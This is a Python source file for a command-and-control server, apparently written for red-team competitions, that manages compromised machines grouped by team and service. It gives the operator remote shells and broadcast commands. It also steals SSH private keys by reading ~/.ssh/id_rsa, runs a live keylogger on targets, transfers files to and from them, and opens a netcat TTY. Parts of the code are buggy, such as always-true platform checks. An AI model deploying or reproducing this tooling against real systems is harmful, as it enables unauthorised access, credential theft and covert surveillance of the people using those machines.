import json
import subprocess
import os
import socket, threading, time
import sys
import signal
import pty
from cmd import Cmd



#TODO A user can make groups and add clients to groups. The user then can select from each group which client to connect to.
#TODO Develop new shell with cmd module
#TODO Encrypt traffic
#TODO Store commands in config file

#TODO The sever knows how many teams and what boxes are on each team. The user can use ls -all to see all teams that are unconnected and connected.


#TODO if the client is already connected, drop the new connection

# class MainShell(cmd):
#     pass 

class Team():
    def __init__(self, identity):
        self.identity = identity
        self.clients = []
    
    def assign(self, client):
        self.clients.append(client) #Append the client to the clients list
        client.setTeam(self)

    def listClients(self):
        print("> Team " + self.identity + ":")
        for client in self.clients:
            try: #Try to see if the client is still alive, if they are, print them. If not, skip them.
                client.getSocket().send("whoami".encode())
                client.getSocket().recv(BUFFER_SIZE)
                print("    >> " + client.getNick())
            except:
                pass

class Service():

    def __init__(self, name):
        self.name = name
        self.clients = []
        self.identifier = list()
        self.breaks = dict()
    
    def addIdentifier(self,host):
        self.identifier.append(host)

    def getBreaks(self):
        pass #Parse file stored in config for breaks

    def listBreaks(self):
        pass #List all breaks

    def selectBreak(self):
        pass #Select break from list to use on all, then confirm to make sure

    def shell(self):
        userIn = input("Enter a command to send to all " + self.name + " clients: ")
        while userIn.lower() != "exit":
            if userIn != "":
                for client in self.clients:
                    try:
                        # x = threading.Thread(target=self.clients[client].sendCommand(userIn))
                        # x.start()
                        client.getSocket().send(userIn.encode())
                        resp = threading.Thread(target=client.receiveResp)
                        resp.start() #server needs to receive response or it will just hang
                        print("Successfully sent command to: " + str(client.getAddr()))
                    except:
                        print("Failed to send command to client: " + str(client.getAddr()))
                print("Command sent to " + str(len(self.clients)) + " clients.")
            time.sleep(.2 * len(self.clients)) #wait .2 seconds for each client 
            userIn = input("Enter a command to send to all " + self.name + " clients: ")
    
    def listClients(self):
        pass #list clients that are active in the shell

    def assign(self, client):
        self.clients.append(client) #Append the client to the clients list
        client.setService(self)

    #TODO Each service has stored commands to break it
    pass

class Connection:
    def __init__(self, addr, socket):
        UNASSIGNED_CONNECTIONS.append(self)
        self.tags = list()
        self.IP = addr[0]
        self.port = addr[1]
        self.socket = socket
        self.addr = addr
        self.nickName = str(addr)
        self.team = 'N/A'
        self.service = 'N/A'
        self.tags = []
        self.assign_client()
    
    def addTags(self, tag):
        self.tags.append(tag)
    
    def setNickName(self, nickname):
        self.nickName = nickname

    def getSocket(self):
        return self.socket
    
    def getAddr(self):
        return self.addr
    
    def getNick(self):
        return self.nickName

    def setTeam(self, team):
        self.team = team
    
    def setService(self, service):
        self.service = service

    def assign_client(self):
        ip_splitted = self.IP.split(".") #Split the IP on the .
        team = ip_splitted[TEAM_INDEX]
        service = ip_splitted[SERVICE_INDEX]
        if team not in TEAMS:
            # print("Team \"" + team + "\" does not exist! Creating..." )
            addTeam(str(team))
        assignTeam(self,TEAMS[team])
        assignService(self,service)

    def sendCommand(self,command): #Send command to client and return output
        self.socket.send(command[0].encode())
        return self.socket.recv(BUFFER_SIZE).decode()
    
    def receiveResp(self):
        print("\tClient (" + str(self.addr[0]) + ") response: '" + str(self.socket.recv(BUFFER_SIZE).decode()).strip() + "'")
        return
        
#DEFAULT VALUES
SERVER_ADDR = "127.0.0.1"
SERVER_PORT = 8080
BUFFER_SIZE = 1024 * 128 #128KB max size
CURRENT_CONNECTIONS = []
CURRENT_IPS = []
CURRENT_CONNECTIONS_CLASS = []
CURRENT_ADDRESSES = []
TEAMS = {}
SERVICES = {}
UNASSIGNED_CONNECTIONS = []
IP_FORMAT = "X.X.TEAM.HOST"

# #If the user starts the server and wants to specify the ip to host on <<OLD>>
# if len(sys.argv) == 2:
#     SERVER_ADDR = sys.argv[1]
# elif len(sys.argv) == 3:
#     SERVER_ADDR = sys.argv[1]
#     SERVER_PORT = int(sys.argv[2])

def selectClient():
    selectedTeam = None
    selectedClient = None
    print("\nSelect Team")
    if len(TEAMS) == 0:
        print("No active teams!")
        return
    for team in TEAMS:
        print(f"{TEAMS[team].identity} ({len(TEAMS[team].clients)})")
    while not selectedTeam:
        try:
            x = input("Select a team: ")
            if "exit" in x:
                return
            selectedTeam = TEAMS[x]
        except:
            pass
    print("Select Client")
    i = 0
    if len(selectedTeam.clients) == 0:
        print("Team has no clients!")
        return
    for client in selectedTeam.clients:
        print(f"{i} - {str(client.IP)}")
        #TODO FIX THIS FUNCTION TO SELECT A CLIENT FROM A TEAM
        i += 1
    while not selectedClient:
        try:
            x = input("Select a client: ")
            if "exit" in x:
                return
            selectedClient = selectedTeam.clients[int(x)]
        except:
            pass
    client_console(client)


#Start server and listen for new connections
def startServer():
    asciiArt = '''
 _____                 _              _     _____             _             _ 
/  __ \               | |            | |   /  __ \           | |           | |
| /  \/ ___  _ __  ___| |_ __ _ _ __ | |_  | /  \/ ___  _ __ | |_ _ __ ___ | |
| |    / _ \| '_ \/ __| __/ _` | '_ \| __| | |    / _ \| '_ \| __| '__/ _ \| |
| \__/\ (_) | | | \__ \ || (_| | | | | |_  | \__/\ (_) | | | | |_| | | (_) | |
 \____/\___/|_| |_|___/\__\__,_|_| |_|\__|  \____/\___/|_| |_|\__|_|  \___/|_|
                                                                              
                                                                              
    '''
    print(asciiArt)
    server_sock.listen(5)
    print()
    print(f"Server is listening on {SERVER_ADDR}:{SERVER_PORT}")
    print()
    SERVER_UP = True
    try:
        while SERVER_UP:
            client_sock, addr = server_sock.accept()
            # print()
            # print()
            # print(f"\n[SERVER] New Connection Received From: {addr[0]}:{addr[1]}")
            if addr[0] in CURRENT_IPS: #if there is already a connection, drop the new one
                client_sock.close()
                continue
            CURRENT_CONNECTIONS_CLASS.append(Connection(addr,client_sock))
            CURRENT_CONNECTIONS.append(client_sock)
            CURRENT_ADDRESSES.append(addr)
            CURRENT_IPS.append(addr[0])
            # print(f"[SERVER] Active Connections: {threading.activeCount() - 6}")
            # print("cmd>")
    except (KeyboardInterrupt, SystemExit, ConnectionAbortedError):
        server_sock.close()
        shutdown_clients()
        SERVER_UP = False
        
#Take socket and addr and issue shell
def handleClient(client):
    client_sock = client.getSocket()
    addr = client.getAddr()
    while True:
        try:
            user_in = input()
            if user_in == 'exit':
                client_sock.send(user_in.encode())
                break
            elif user_in == '':
                print(f"{addr[0]}>",end='')
            elif user_in.split()[0] == "cd":
                client_sock.send(user_in.encode())
                print(f"{addr[0]}>",end='')
                continue
            else:
                client_sock.send(user_in.encode())
                client_sock.settimeout(3.0) #timeout after 3 seconds of no recv
                serv_resp = client_sock.recv(BUFFER_SIZE).decode()
                client_sock.settimeout(None) #reset timeout
                print(f"{serv_resp}")
                print(f"{addr[0]}>",end='')
        except socket.timeout as e:
            print("Process timed out. \n" + str(e))
            print(f"{addr[0]}>",end='')
        except BrokenPipeError as e:
            print("Connection closed. Broken pipe.")
            break
        except Exception as e:
            print("Error sending command! \n" + str(e))
            print(f"{addr[0]}>",end='')
            continue

def copyKey(client_sock):
    try:
        client_sock.send("hostname".encode())
        hostName = client_sock.recv(BUFFER_SIZE).decode().strip()
        if os.path.exists(f"{os.path.expanduser('~')}/client_keys/{hostName}"):
            print("Private key exists for: " + hostName)
            print("\n>",end="")
            return
        try:
            subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys/{hostName}",shell=True)
        except:
            subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys",shell=True)
            subprocess.run(f"mkdir -p {os.path.expanduser('~')}/client_keys/{hostName}",shell=True)
        client_sock.send("cat ~/.ssh/id_rsa".encode())
        subprocess.run(f"touch {os.path.expanduser('~')}/client_keys/{hostName}/id_rsa",shell=True)
        with open(f"{os.path.expanduser('~')}/client_keys/{hostName}/id_rsa","w") as file:
            file.write(client_sock.recv(BUFFER_SIZE).decode())
            print(f"Private key copied for: {hostName}")
        print("\n>",end="")
    except:
        print("Private key NOT copied!")
    
#Main Console for C2
def handleCommand():
    while True:
        try:
            cmd = input("cmd> ")
            if cmd.lower() == "list" or cmd.lower() == "ls":
                list_clients()
            elif cmd.lower() == "lsteam" or cmd.lower() == "listteam":
                listTeams()
            elif "assign" in cmd.lower():
                assignLoop()
            elif "mkteam" in cmd.lower():
                addTeam(input("Input team name: "))
            elif "select" in cmd.lower() or "sel" in cmd.lower():
                selectClient()
                # client_console(cmd)
                # client,addr = select_client(cmd)
                # if client == None:
                #     print("Client does not exist!")
                # else:
                #     handleClient(client,addr)
            elif cmd.lower() == "help":
                print("\nHelp Menu: \n\tUse 'list' to list active connections. \
                    \n\tUse 'select' to choose a client from the list. \
                    \n\tUse 'lsteam' to list each team's connections. \
                    \n\tUse 'assign' to assign a client to a team. \
                    \n\tUse 'mkteam' to create a team. \
                    \n\tUse 'service' to list services. \
                    \n\tUse 'help' to show this menu. \
                    \n\tUse 'exit' to quit the program.")
            elif cmd.lower() == "exit":
                print("[SERVER] Server is closing. Goodbye!")
                #SHUTDOWN ALL CONNECTIONS
                shutdown_clients()
                server_sock.close()
                break
            elif "service" in cmd.lower():
                serviceShell()
            else:
                print("Command unknwon. Use 'help' to list commands.")
        except (KeyboardInterrupt, SystemExit, ConnectionAbortedError):
            print("\nUse 'exit' to close.")
        except Exception as e:
            print("Invalid use of command! \n" + str(e))
            
def serviceShell():
    userIn = "notAService"
    while userIn not in SERVICES.keys():
        if userIn.lower() == "exit":
            return
        print("\nPlease select a service below: ")
        for service in SERVICES:
            print("\t>> " + service)
        userIn = input("Enter the name of the service you want to select: ")
    service = SERVICES[userIn]
    service.shell()

#List Current Connections
def list_clients():
    results = ""
    i = 0
    for client in CURRENT_CONNECTIONS:
        try:
            cwd = None
            client.send(str.encode('pwd'))
            cwd = client.recv(201480).decode()
            client.send(str.encode('whoami'))
            whoami = client.recv(201480).decode()
            whoami = whoami.strip()
            if cwd is None:
                CURRENT_CONNECTIONS.remove(i)
                CURRENT_ADDRESSES.remove(i)
        except:
            del CURRENT_CONNECTIONS[i]
            del CURRENT_ADDRESSES[i]
            continue

        results += str(i) + " - " + whoami + "@" + str(CURRENT_ADDRESSES[i][0]) + ":" + str(CURRENT_ADDRESSES[i][1]) + ":" + str(cwd) + "\n"
        i+=1

    if len(CURRENT_CONNECTIONS) != 0:
        print("[SERVER] ACTIVE CLIENTS:")
        print(results)
    else:
        print("No active connections!")

def addTeam(identity):
    TEAMS[identity] = Team(str(identity))
    print("Team \"" + str(identity) + "\" created successfully.")

def assignTeam(client, team):
    team.assign(client)
    UNASSIGNED_CONNECTIONS.remove(client)

def assignService(client, serviceIndex):
    for service in SERVICES:
        if serviceIndex in SERVICES[service].identifier:
            SERVICES[service].assign(client)

def listTeams():
    print("Team's Connections:")
    for team in TEAMS:
        TEAMS[team].listClients()
    if(UNASSIGNED_CONNECTIONS):
        print("\nUnassigned Clients: ")
        for client in UNASSIGNED_CONNECTIONS:
            print(client.getNick())

def assignLoop():
    while(UNASSIGNED_CONNECTIONS):     #If there are unassigned clients
        print("Current Unassigned Clients: ")
        for i in range(len(UNASSIGNED_CONNECTIONS)):
            print(f"\t{i} - {UNASSIGNED_CONNECTIONS[i].getNick()}")
        target = input("Enter the index of which user you would like to assign: ")
        if target == "exit":
            print("Exiting.")
            break
        else:
            client = UNASSIGNED_CONNECTIONS[int(target)]
        for i in range(len(TEAMS)):
            print(f"\t{i} - {TEAMS[i].identity}")
        target = input(f"Enter the index of which team you would like {client.getNick()} to: ")
        if target == "exit":
            print("Exiting.")
            break
        else:
            assignTeam(client, TEAMS[int(target)])
    else:
        print("There are no unassigned clients!")

    #List unassigned clients
    #Ask user to input which client to assign
    #If the user says exit, then quit
    #List teams
    #Ask user which team to assign client to
    #If the user says exit, then quit
    #If there are more unassigned clients, repeat
    #TODO add ability to reassign

#Console to send commands to a client when user selects client
def client_console(client): #previously took in cmd
    try:
        # target = cmd.replace("select ", "")
        # target = cmd.replace("sel ", "")
        # target = int(target)
        # connection = CURRENT_CONNECTIONS_CLASS[target]
        connection = client

        print("Connected to: " + str(client.IP) + ":" + str(client.port))
        while True:
            print("Console: " + str(client.IP)+">",end="")
            newCMD = input()
            if "shell" in newCMD:
                clientSock = connection
                addr = client.getAddr()
                if client == None:
                    print("Client does not exist!")
                else:
                    print("Active Shell On: " + str(client.IP) + ":" + str(client.port))
                    print("\n" + str(client.IP) + ">",end = '')
                    handleClient(clientSock)
            elif "dl" in newCMD: #Download file
                download_file(newCMD,clientSock)
            elif "up" in newCMD: #Upload file
                upload_file(newCMD,clientSock)
            elif "keylogger" in newCMD:
                start_keylog(newCMD,clientSock)
            elif "tty" in newCMD:
                startTTY(client.IP)
            elif "key" in newCMD.lower():
                copyKey(clientSock)
            elif "ncport" in newCMD.lower():
                clientSock.socket.send("ncport".encode())
                print("Netcat is being hosted on: " + client.IP + ":" + clientSock.socket.recv(BUFFER_SIZE).decode())
            elif "setnick" in newCMD.lower():
                newCMD.replace("setnick","")
                clientSock.setNickName(newCMD)
            elif "reset" in newCMD.lower():
                connection.socket.send("reset_connection".encode())
            elif "help" in newCMD: #Help menu
                print("\nHelp Menu:\
                    \n\tUse 'exit' to return to main menu. \
                    \n\tUse 'help' to show this menu. \
                    \n\tUse 'shell' to gain a shell on the client's machine \
                    \n\tUse 'key' to copy the clients SSH key to your machine \
                    \n\tUse 'dl' to download a file.\
                    \n\tUse 'ul' to upload a file.\
                    \n\tUse 'keylogger' to start a live keylog of the clients machine.\
                    \n\tUse 'ncport' to get the port the shell is listening on.\
                    \n\tUse 'tty' to start a new TTY in netcat.\n")
            elif "exit" in newCMD:
                break
            else:
                print("Command unknwon. Use 'help' to list commands.")
    except Exception as e:
        print("Invalid use of command! \n" + str(e))

#Used to break keylogger with ctrl-z
def ctrlC(signum, frame):
    raise KeyboardInterrupt

def start_keylog(cmd,conn):
    signal.signal(signal.SIGTSTP, ctrlC)
    signal.signal(signal.SIGTERM, ctrlC)
    print("Keylogger starting...\nIMPORTANT:\nUse ctrl+z & ctrl+c to end logging.")
    conn.send("START_KEYL0GGER".encode())
    try:
        log = ''
        print()
        os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
        while True:
            print("Keylogger in progress...\nUse ctrl+z & ctrl+c to end logging.\n")
            print(f"{log}",end="\r")
            out = conn.recv(BUFFER_SIZE).decode()
            if out == "NO_DEPENDENCIES":
                print("Dependencies for keylogger not installed on target.")
                break
            os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
            if out == "BACKSPACE": #If the user hit backspace, delete one keystroke from the string
                try:
                    if log[len(log)-1] == ")": #check if the last char is a ), it might be a Key.
                        i = len(log)-1 #Set i = length of the log - 1
                        while(log[i]) != "(": #Iterate backwards until we find a (
                            i-=1
                        if log[i:i+4] == "(Key": #If the string is '(Key' then we found a key to delete. 
                            log = log[:i-1] #Delete the keystroke and one char before it
                        else:
                            log = log[:-1]
                    else:
                        log = log[:-1] #If the last char isn't a ), then just delete one char
                except IndexError:
                    log = log[:-1] + ' ' #If index out of bounds, just delete one and add a space
            elif out == "ENTER": #If the user hit enter, make a new line
                log += "\n"
            else:
                log += out

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear') #Clear the screen. Use cls on Windows or clear on Unix
        conn.send("KEY_L0GGER-END".encode())
        print("Keylogger ending... Returning to client menu.")
        
def download_file(cmd,conn):
    try:
        conn.send(("DOWNLOAD_FILE_FROM_S3RVER").encode()) #Tell client we want to download
        path = cmd.replace("dl ","") #Get the path of the requested download
        if conn.recv(BUFFER_SIZE).decode() == "READY": #Wait for client to be ready
            conn.send(path.encode()) #Send the path to client
            path = path.split("/") #Split the path by slash
            with open(path[len(path)-1],"ab") as f: #Open a file with just the filename
                data = conn.recv(BUFFER_SIZE) #Recieve data from client
                while data: #While data is not None
                    if data.decode() == "DOWNLOADING_FILE_FROM_S3RVER_COMPLETE": #If it is done, break
                        break
                    elif data.decode() == "DOWNLOAD_ERROR": #If there's an error, tell us and break
                        print("File was not found on target machine.")
                        break
                    f.write(data) #Write to the file
                    conn.send("ACK".encode()) #Tell the client we got it
                    data = conn.recv(BUFFER_SIZE) #Wait for more data
            print(path[len(path)-1] + " saved to: " + os.getcwd()) #Print that the file was downloaded and saved
    except KeyboardInterrupt as e:
        print("File Download Stopped.")

def upload_file(cmd,conn):
    try:
        path = cmd.replace("up ","")
        conn.send(("UPLOADING_FILE_FROM_S3RVER").encode())
        if conn.recv(BUFFER_SIZE).decode() == "READY":
            conn.send(path.encode())
            with open(path,"rb") as f:
                data = f.read(BUFFER_SIZE)
                while data:
                    conn.send(data)
                    if(conn.recv(BUFFER_SIZE).decode()) == "ACK":
                        data = f.read(BUFFER_SIZE)
                    else:
                        print("An error has occured!")
                        break

                conn.send("UPLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
                if conn.recv(BUFFER_SIZE).decode() == "DONE":
                    print("File uploaded successfully!")

    except FileNotFoundError or FileExistsError as e:
        conn.send("UPLOADING_FILE_FROM_S3RVER_COMPLETE".encode())
        print("File not found! \n"+ str(e))
    except KeyboardInterrupt:
        print("File Upload Stopped.")

#Start server as a thread to constantly accept new clients, then open the C2 console.
def create_threads():
    t = threading.Thread(target=startServer) 
    t.daemon = True
    t.start()
    time.sleep(1)
    handleCommand()

#Open TTY by connecting via netcat
def startTTY(IP):
    OS = sys.platform
    if OS == "win32" or "cygwin": #If the machine is Windows
        pass
    if OS == "linux" or "darwin" or "freebsd": #If the machine is linux or MacOS or FreeBSD
        try:
            print("Entering TTY!")
            pty.spawn(f"/usr/local/bin/netcat {IP} 8081")
        except KeyboardInterrupt:
            print("Exiting TTY!")

#Disconnect all clients and end sockets - UPDATED TO RESET CONNECTION TO KEEP ALIVE
def shutdown_clients():
    for conn in CURRENT_CONNECTIONS:
        conn.send("reset_connection".encode())

def createService(service,identifier):
    if service not in SERVICES:
        SERVICES[service] = Service(service) #make the service
        print("Successfully created service: " + service)
    hosts = identifier.split(",")
    for host in hosts:
        SERVICES[service].addIdentifier(host) #add an Identifier
        print("Successfully added identifier " + host + " to service: " + service)
#Takes in config file and creates necessary objects 
def setup():
    try:
        with open("config.json") as config:
            config = json.load(config) #Load the config file
        for service in config["services"][0]: #Create a service for each service
            createService(service,config["services"][0][service])
        global TEAMS_INT
        TEAMS_INT = int(config["topology"][0]["teams"]) #Pull the # of all teams
        for i in range(TEAMS_INT): #Create all teams
            addTeam(str(i))
            # print("Successfuly created team: " + str(i))
        global IP_FORMAT
        IP_FORMAT = config["topology"][0]["ipSyntax"]
        global SERVICE_INDEX
        SERVICE_INDEX = IP_FORMAT.split(".").index("HOST")
        global TEAM_INDEX
        TEAM_INDEX = IP_FORMAT.split(".").index("TEAM")
        global SERVER_ADDR
        SERVER_ADDR = config["topology"][0]["serverIP"]
        global SERVER_PORT
        SERVER_PORT = int(config["topology"][0]["serverPort"])
    except:
        print("Could not parse config file! Please restart C2 with the correct format!")
        global server_sock
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #bind the server to that IP and port
    server_sock.bind((SERVER_ADDR, SERVER_PORT))

if __name__ == "__main__":
    print("[SERVER] Server is starting...") 
    setup()
    time.sleep(1)
    create_threads()